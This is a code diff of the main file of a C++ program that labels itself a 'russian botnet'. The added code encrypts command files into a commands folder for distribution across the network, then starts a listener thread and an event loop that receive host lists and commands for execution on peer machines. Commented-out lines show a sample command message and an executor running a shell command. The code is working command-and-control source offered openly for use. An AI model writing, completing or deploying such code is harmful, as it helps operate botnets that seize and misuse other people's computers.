@@ -1,75 +1,132 @@
+#include "crypter.h"
 #include "globaltransporter.h"
+#include "hostlistcollector.h"
 #include "thread"
 #include <iostream>
 
 using namespace std;
-std::string printHelp(char * firstArgument){
-    std::cout << "russian botnet" << std::endl << "usage: " <<std::string (firstArgument) << " [init|load] [noPing|ping] [local|world]" << std::endl;
+std::string printHelp(char *firstArgument)
+{
+    std::cout << "russian botnet" << std::endl
+              << "usage: " << std::string(firstArgument)
+              << " [init|load] [base|simple] [local|world]" << std::endl;
 }
-int main(int argc, char *argv[])
-{//std::this_thread::sleep_for(std::chrono::seconds(3));
-    if (argc != 4){
+#include <openssl/sha.h>
 
+
+void loadCmdToNetwork(){
+    Crypter * _crypter = new Crypter();
+    std::string path = "cmdForLoad";
+    //std::map<int, std::string> result;
+    for (const auto & entry : std::filesystem::directory_iterator(path)){
+        std::string filename = entry.path();
+        std::string forId = filename.substr(filename.find("/")+1, filename.size());
+        std::cout << entry.path() <<" " << forId<< std::endl;
+
+        int id = std::stoi(forId);
+        std::string command = "";
+        std::string line = "";
+        std::ifstream in(entry.path());
+        if (in.is_open())
+        {
+            while (std::getline(in, line))
+            {
+                command += line + "\n";
+            }
+        }
+        in.close();
+        std::string cryptedCmd = _crypter->crypt(command);
+        std::ofstream out;          // поток для записи
+        out.open("commands/"+std::to_string(id)  + "_c.txt");      // открываем файл для записи
+        if (out.is_open())
+        {
+            out << cryptedCmd;
+        }
+        else{
+            std::cout << "Cant rewrite file" << std::endl;
+        }
+        out.close();
+
+    }
+}
+bool simpleSHA256(void* input, unsigned long length, unsigned char* md)
+{
+    SHA512_CTX context;
+    if(!SHA512_Init(&context))
+        return false;
+
+    if(!SHA512_Update(&context, (unsigned char*)input, length))
+        return false;
+
+    if(!SHA512_Final(md, &context))
+        return false;
+
+    return true;
+}
+
+int main(int argc, char *argv[])
+{
+
+    if (argc == 2 && std::string(argv[1]) == "loader"){
+        loadCmdToNetwork();
+        return 0;
+    }
+    if (argc != 4) {
         printHelp(argv[0]);
         return 1;
     }
 
-    GlobalTransporter * global;
-    bool noPing;
+    GlobalTransporter *global;
+    bool isSimpleMode;
     bool local;
-    if (std::string(argv[2]) == "noPing"){
-        noPing = true;
+    if (std::string(argv[2]) == "simple") {
+        isSimpleMode = true;
+    } else if (std::string(argv[2]) == "base") {
+        isSimpleMode = false;
     }
-    else if(std::string(argv[2]) == "ping"){
-        noPing = false;
-    }
-    else{
+    else {
         printHelp(argv[0]);
-                return 1;
+        return 1;
     }
 
-
-    if (std::string(argv[3]) == "local"){
-        local= true;
-    }
-    else if(std::string(argv[3]) == "world"){
+    if (std::string(argv[3]) == "local") {
+        local = true;
+    } else if (std::string(argv[3]) == "world") {
         local = false;
-    }
-    else{
+    } else {
         printHelp(argv[0]);
-                return 1;
+        return 1;
     }
-    global = new GlobalTransporter(!noPing, local);
+    global = new GlobalTransporter(isSimpleMode, local);
 
-
-    if (std::string(argv[1]) == "load"){
+    if (std::string(argv[1]) == "load") {
         global->load();
-    }
-    else if (std::string(argv[1]) == "init"){
+    } else if (std::string(argv[1]) == "init") {
         global->init();
     }
-    else{
+    else {
         printHelp(argv[0]);
         delete global;
         return 1;
     }
-        /*
-    global->load();
-    //std::this_thread::sleep_for(std::chrono::seconds(3));
-    global->save();*/
-    std::thread * thread = new std::thread(&GlobalTransporter::startListening,global);
-    //     //global->startListening();
+
+    std::thread *thread = new std::thread(&GlobalTransporter::startListening, global);
+
     cout << endl << "EVENT LOOP START!" << endl << endl;
     global->eventLoop();
-    // //global->accept("updateResponse{hostList{<host>192.168.0.11:3456</host>\n<host>192.168.0.13:3312</host>\n}hostListcommands{<command><id>12</id>echo 0</command>}commands}updateResponse");
-    // cout << "end" << endl;
-
-
-    // Executor exec(time(0));
-    // exec.startExecute("echo 0", 32);
-    // std::this_thread::sleep_for(std::chrono::seconds(5));
-    // std::cout << "Executed - " << exec.getFirstExecutedId();
-
 
     return 0;
+    // CryptManager * crypt = CryptManager::getCryptManager();
+    // std::string data  = "compute123";
+    // std::string data1  = "compute133";
+    // std::string result = crypt->genSha512Hash(data1);
+    // std::string base =  crypt->toBase(result);
+    // std::cout <<base  << " compare "<<crypt->compareWithSha512Hash(data,crypt->fromBase(base) )<< std::endl;
+    // unsigned char md[64]; // 32 bytes
+    // if(!simpleSHA256(data.data(), data.size(), md))
+    // {
+    //     std::cout << "err" << std::endl;
+    // }
+    // std::cout << crypt->toBase(std::string((char*)md,64)) << std::endl;
+
 }
